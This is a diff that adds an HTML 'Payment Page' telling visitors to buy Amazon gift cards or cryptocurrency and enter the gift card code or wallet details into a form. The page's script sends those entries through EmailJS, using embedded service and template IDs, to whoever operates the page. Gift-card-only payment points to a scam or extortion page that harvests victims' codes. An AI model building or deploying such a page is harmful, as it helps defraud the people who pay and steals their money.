@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Page</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f4f4f4; text-align: center; }
+        .container { width: 60%; margin: auto; padding: 20px; background-color: #fff; border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.2); border: 2px solid #007BFF; }
+        h1 { color: #007BFF; margin-bottom: 20px; }
+        .section { margin: 20px 0; }
+        .section h2 { color: #FF6600; margin-bottom: 10px; }
+        .payment-option { margin: 20px 0; }
+        .payment-option label { display: block; padding: 10px; border-radius: 5px; cursor: pointer; transition: background-color 0.3s, box-shadow 0.3s; }
+        .payment-option input { display: none; }
+        .payment-option input:checked + label { background-color: #007BFF; color: #fff; box-shadow: 0 0 10px rgba(0,0,0,0.2); }
+        .links { color: #FF6600; text-decoration: none; }
+        .links:hover { text-decoration: underline; }
+        .code-input { margin: 20px 0; position: relative; }
+        .code-input input { padding: 10px; width: calc(100% - 22px); border: 2px solid #007BFF; border-radius: 5px; }
+        .example { display: block; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }
+        .example.gift-card { background-color: #d4edda; border-color: #c3e6cb; color: #155724; }
+        .example.cryptocurrency { background-color: #d1ecf1; border-color: #bee5eb; color: #0c5460; }
+        .submit-button { background-color: #007BFF; color: #fff; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
+        .submit-button:hover { background-color: #0056b3; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Choose Your Payment Method</h1>
+        <form id="payment-form">
+            <div class="payment-option">
+                <input type="radio" id="gift-card" name="payment-method" value="Gift Card" required>
+                <label for="gift-card">Gift Card</label>
+                <p>To buy gift cards, visit <a href="https://www.amazon.com/gift-cards" class="links" target="_blank">Amazon Gift Cards</a> or <a href="https://www.giftcardgranny.com" class="links" target="_blank">Gift Card Granny</a>.</p>
+            </div>
+            <div class="payment-option">
+                <input type="radio" id="cryptocurrency" name="payment-method" value="Cryptocurrency" required>
+                <label for="cryptocurrency">Cryptocurrency</label>
+                <p>To buy cryptocurrencies, visit <a href="https://www.binance.com" class="links" target="_blank">Binance</a>.</p>
+            </div>
+            <div class="code-input" id="code-container">
+                <label for="code">Enter your code after purchase:</label>
+                <input type="text" id="code" name="code" placeholder="Your code here" required>
+            </div>
+            <button type="submit" class="submit-button">Submit</button>
+        </form>
+        <div class="section">
+            <h2>Instructions for New Users</h2>
+            <p><strong>Gift Card:</strong> To buy a gift card, click on one of the links (Amazon Gift Cards or Gift Card Granny). Choose the card amount and follow the instructions to complete the purchase. Once you have your code, enter it in the field provided on this page.</p>
+            <p class="example gift-card"><strong>Example code: </strong>1234-5678-9012-3456</p>
+            <p><strong>Cryptocurrency:</strong> To buy cryptocurrencies, click on the Binance link. Create an account if you don't have one, buy the cryptocurrency of your choice, and then enter the code or wallet address in the field provided on this page.</p>
+            <p class="example cryptocurrency"><strong>Example code: </strong>0xAbC1234567890dEfGhIjKlMnOpQrStUvWxYz</p>
+        </div>
+    </div>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function(){ emailjs.init("o3_eBjDbOrOKgyIcS"); })();
+
+        function updatePlaceholder() {
+            var codeInput = document.getElementById('code');
+            var selectedOption = document.querySelector('input[name="payment-method"]:checked');
+            if (selectedOption) { 
+                codeInput.placeholder = selectedOption.value === 'Gift Card' ? 'Enter your gift card code' : 'Enter your wallet address or cryptocurrency code'; 
+            }
+        }
+
+        document.querySelectorAll('input[name="payment-method"]').forEach(function(input) { 
+            input.addEventListener('change', updatePlaceholder); 
+        });
+
+        document.getElementById('payment-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            var form = event.target, formData = new FormData(form);
+            emailjs.sendForm('service_md8ouvo', 'template_fclz7u8', formData).then(function(response) {
+                alert('Your request has been sent successfully.');
+                window.location.href = 'index4.html';
+            }, function(error) { 
+                alert('An error occurred. Please try again.'); 
+            });
+        });
+
+        updatePlaceholder();
+    </script>
+</body>
+</html>
